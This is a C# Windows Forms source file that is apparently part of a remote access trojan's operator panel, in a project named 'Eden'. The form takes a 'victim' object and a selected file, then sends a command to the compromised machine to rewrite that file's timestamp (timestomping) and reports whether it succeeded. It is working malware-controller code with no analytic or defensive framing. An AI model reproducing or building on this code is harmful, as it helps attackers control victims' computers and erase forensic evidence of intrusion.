using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileDatetime : Form
    {
        private clsVictim m_victim { get; set; }
        private frmFileMgr.stEntryTag m_entry { get; set; }

        public frmFileDatetime(clsVictim victim, frmFileMgr.stEntryTag entry)
        {
            InitializeComponent();

            m_victim = victim;
            m_entry = entry;
        }

        private void fnServRecv(clsClient clnt, string szVictimID, List<string> asMsg)
        {
            try
            {
                if (!string.Equals(szVictimID, m_victim.m_szID))
                    return;

                if (asMsg[0] == "file")
                {
                    if (asMsg[1] == "dt")
                    {
                        if (string.Equals(asMsg[2], "1"))
                        {
                            MessageBox.Show("Action successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            Close();
                        }
                        else
                        {
                            MessageBox.Show(asMsg[3], "FileDatetime", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnSetup()
        {
            textBox1.ReadOnly = true;

            m_victim.m_clnt.ServerMessageReceived += fnServRecv;
        }

        private void frmFileDatetime_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szFilePath = m_entry.szFullName;
            DateTime dt = dateTimePicker1.Value;

            Task.Run(() =>
            {
                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "dt",
                    szFilePath,
                    dt.ToString("F"),
                }));
            });
        }

        private void frmFileDatetime_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnServRecv;
        }
    }
}
